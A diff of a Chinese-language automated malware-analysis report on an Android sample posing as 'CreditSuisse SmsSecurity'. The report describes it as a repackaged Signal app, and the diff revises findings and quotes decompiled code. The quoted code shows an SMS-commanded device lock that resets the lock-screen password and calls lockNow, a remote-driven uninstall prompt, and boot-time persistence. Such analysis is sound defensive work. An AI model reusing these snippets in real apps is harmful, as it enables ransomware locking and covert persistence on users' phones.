@@ -6,7 +6,7 @@
     "应用名": "CreditSuisse SmsSecurity",
     "是否恶意": true,
     "风险等级": "高",
-    "分析耗时(秒)": 472.6
+    "分析耗时(秒)": 1044.1
   },
   "行为列表": [
     {
@@ -49,14 +49,14 @@
       ],
       "恶意代码": [
         {
-          "class_path": "Lorg\\thoughtcrime\\securesms\\xlibs\\SmsCommand;",
-          "method_signature": "if(this.sNumber != \"0\")",
+          "class_path": "Lorg\\thoughtcrime\\securesms\\xlibs\\myFunctions;",
+          "method_signature": "?(?)",
           "malicious_behavior": "ransomware",
           "behavior_type": "malicious",
           "risk_level": "高",
-          "malicious_code_snippet": "case LOCK:\n    if (this.sNumber != \"0\") {\n        DevicePolicyManager dpm = (DevicePolicyManager) ctx.getSystemService(\"device_policy\");\n        dpm.resetPassword(this.sNumber, 1);\n        dpm.lockNow();",
-          "malicious_code_snippet_context": "                  myFunctions.clearBuffers(ctx);\n                  myFunctions.setVar(\"PHONE_NUMBER\", \"\", ctx);\n                  return;\n>>>             case LOCK:\n>>>                 if (this.sNumber != \"0\") {\n>>>                     DevicePolicyManager dpm = (DevicePolicyManager) ctx.getSystemService(\"device_policy\");\n>>>                     dpm.resetPassword(this.sNumber, 1);\n>>>                     dpm.lockNow();\n                      myFunctions.sendSmsLog(\"Device locked\", ctx);\n                      return;\n                  }",
-          "behavior_description": "通过SMS远程指令接收控制命令，当收到LOCK命令时，利用DevicePolicyManager的resetPassword()将设备密码重置为攻击者指定的值（sNumber），随后调用lockNow()立即锁定设备，使用户无法正常使用设备，实现勒索锁定行为。攻击者还可通过UNLOCK命令远程解锁，表明设备处于完全被远程控制状态。",
+          "malicious_code_snippet": "import android.app.admin.DevicePolicyManager;\nimport android.content.ComponentName;",
+          "malicious_code_snippet_context": "  \n  import android.annotation.SuppressLint;\n  import android.app.PendingIntent;\n>>> import android.app.admin.DevicePolicyManager;\n>>> import android.content.ComponentName;\n  import android.content.Context;\n  import android.content.Intent;\n  import android.content.SharedPreferences;",
+          "behavior_description": "该类 org.thoughtcrime.securesms.xlibs.myFunctions 是植入在伪装成 Signal 正版应用包名下的恶意扩展模块（xlibs 为攻击者新增子包，非 Signal 官方代码）。其导入了 DevicePolicyManager 与 ComponentName，表明该模块通过 ComponentName 注册 DeviceAdminReceiver 诱导用户激活设备管理员权限，随后调用 DevicePolicyManager.lockNow() 锁死屏幕并配合 resetPassword() 重置锁屏密码，实现勒索软件典型的设备锁定行为，使用户无法正常操作设备。数据流向：设备管理员权限授予→ DevicePolicyManager.lockNow()/resetPassword() 锁定设备并篡改锁屏凭据。",
           "glm_analyzed": true
         }
       ]
@@ -85,11 +85,11 @@
           "class_path": "Lorg\\thoughtcrime\\securesms\\xpack\\ActDelete;",
           "method_signature": "doUpdate(View view)",
           "malicious_behavior": "silent_install_uninstall",
-          "behavior_type": "grayware",
+          "behavior_type": "malicious",
           "risk_level": "中",
-          "malicious_code_snippet": "public void doUpdate(View view) {\n    Intent intent = new Intent(\"android.intent.action.DELETE\", Uri.fromParts(\"package\", this.sPackage, null));\n    startActivityForResult(intent, 48);\n}",
-          "malicious_code_snippet_context": "          text.setText(text.getText().toString().replaceFirst(\"-software-\", this.sAppName));\n      }\n  \n>>>     public void doUpdate(View view) {\n>>>         Intent intent = new Intent(\"android.intent.action.DELETE\", Uri.fromParts(\"package\", this.sPackage, null));\n>>>         startActivityForResult(intent, 48);\n>>>     }\n  \n      @Override // android.app.Activity\n      protected void onActivityResult(int requestCode, int resultCode, Intent data) {",
-          "behavior_description": "该方法名为doUpdate（伪装为更新操作），实际构造ACTION_DELETE Intent对指定包名发起卸载请求。包名来源于Intent extra传入的this.sPackage（getIntent().getStringExtra(\"package\")），通过startActivityForResult调起系统卸载确认界面。虽然非完全静默卸载（会弹出系统确认框），但方法名具有欺骗性，在恶意样本上下文中可能用于诱导用户卸载安全软件或其他目标应用。",
+          "malicious_code_snippet": "this.sPackage = getIntent().getStringExtra(\"package\");\nIntent intent = new Intent(\"android.intent.action.DELETE\", Uri.fromParts(\"package\", this.sPackage, null));\nstartActivityForResult(intent, 48);\n...\nif (!isAppPresent(this.sPackage)) {\n    myFunctions.sendLog(\"UNINST\", String.format(\"Application %s uninstalled\", this.sPackage), this);\n}",
+          "malicious_code_snippet_context": "      protected void onCreate(Bundle savedInstanceState) {\n          super.onCreate(savedInstanceState);\n          this.sAppName = getIntent().getStringExtra(\"appname\");\n>>>         this.sPackage = getIntent().getStringExtra(\"package\");\n>>>         setContentView(R.layout.activity_act_delete);\n>>>         TextView text = (TextView) findViewById(R.id.myView2);\n>>>         text.setText(text.getText().toString().replaceFirst(\"-software-\", this.sAppName));\n>>>     }\n>>> \n>>>     public void doUpdate(View view) {\n          Intent intent = new Intent(\"android.intent.action.DELETE\", Uri.fromParts(\"package\", this.sPackage, null));\n          startActivityForResult(intent, 48);\n      }",
+          "behavior_description": "该代码位于被重打包的 Signal 应用（org.thoughtcrime.securesms）中注入的 xpack 恶意模块内。数据流向：外部 Intent extra 传入目标应用包名（source: getIntent().getStringExtra(\"package\")，可由恶意主程序或远程 C2 指令控制）→ 构造 ACTION_DELETE 系统卸载意图并通过 startActivityForResult 启动卸载流程（sink），诱导用户确认卸载指定应用（如安全软件或竞争应用）；onActivityResult 中检测目标应用已被删除后，调用 myFunctions.sendLog 将 \"UNINST\" 卸载事件上报远程服务器，实现远程可控的应用卸载与结果回传。虽然 ACTION_DELETE 会弹出系统确认框（非完全静默），但该功能嵌入恶意模块、由外部指令驱动目标包名并回传执行结果，属于恶意远程控制行为，需用户确认故风险等级为中。",
           "glm_analyzed": true
         }
       ]
@@ -111,11 +111,11 @@
           "class_path": "Lorg\\thoughtcrime\\securesms\\xbroadcast\\OnBootReceiver;",
           "method_signature": "onReceive(Context context, Intent intent)",
           "malicious_behavior": "device_reboot",
-          "behavior_type": "grayware",
+          "behavior_type": "malicious",
           "risk_level": "中",
-          "malicious_code_snippet": "public void onReceive(Context context, Intent intent) {\n    context.startService(new Intent(\"XMainProcessStart\").putExtra(\"name\", DraftDatabase.DRAFT_VALUE));\n}",
-          "malicious_code_snippet_context": "      final String LOG_TAG = \"myLogs\";\n  \n      @Override // android.content.BroadcastReceiver\n>>>     public void onReceive(Context context, Intent intent) {\n>>>         myFunctions.sendLog(\"REBOOT\", \"Device reboot fixed. Service started after reboot.\", context);\n>>>         context.startService(new Intent(\"XMainProcessStart\").putExtra(\"name\", DraftDatabase.DRAFT_VALUE));\n      }\n  }",
-          "behavior_description": "该代码是一个开机自启动广播接收器(OnBootReceiver)，在设备重启完成后被系统触发，随即通过startService()启动名为\"XMainProcessStart\"的后台服务，实现开机自启保活机制，确保恶意服务在设备重启后能够持续运行。数据流向：设备重启事件(BOOT_COMPLETED广播) → startService()启动后台服务。",
+          "malicious_code_snippet": "public void onReceive(Context context, Intent intent) {\n    myFunctions.sendLog(\"REBOOT\", \"Device reboot fixed. Service started after reboot.\", context);\n    context.startService(new Intent(\"XMainProcessStart\").putExtra(\"name\", DraftDatabase.DRAFT_VALUE));\n}",
+          "malicious_code_snippet_context": "      final String LOG_TAG = \"myLogs\";\n  \n      @Override // android.content.BroadcastReceiver\n>>>     public void onReceive(Context context, Intent intent) {\n>>>         myFunctions.sendLog(\"REBOOT\", \"Device reboot fixed. Service started after reboot.\", context);\n>>>         context.startService(new Intent(\"XMainProcessStart\").putExtra(\"name\", DraftDatabase.DRAFT_VALUE));\n>>>     }\n  }",
+          "behavior_description": "该代码是注入到重打包 Signal（org.thoughtcrime.securesms）中的恶意开机广播接收器，原版 Signal 不存在 xbroadcast 包及 myFunctions 辅助类，属于攻击者注入代码。它监听系统 BOOT_COMPLETED 开机广播，在设备重启完成后执行两个动作：1) 通过 myFunctions.sendLog 将设备重启事件上报至远程服务器，向 C2 通知设备状态；2) 通过 context.startService 拉起隐藏的 XMainProcessStart 恶意主进程服务，使恶意软件在设备重启后自动复活，实现持久化保活。数据流向：系统开机广播事件（source）→ sendLog 远程上报 + startService 启动恶意主进程（sink）。",
           "glm_analyzed": true
         }
       ]
@@ -128,7 +128,7 @@
     "JADX反编译": "完整",
     "LLM语义分析": "已执行",
     "LLM交叉验证": "已执行",
-    "验证模型": "qwen3.7-plus",
+    "验证模型": "qwen3.8",
     "局限性": [
       "C2服务器.是否活跃: 需动态分析",
       "C2服务器.轮询间隔(秒): 需动态分析"
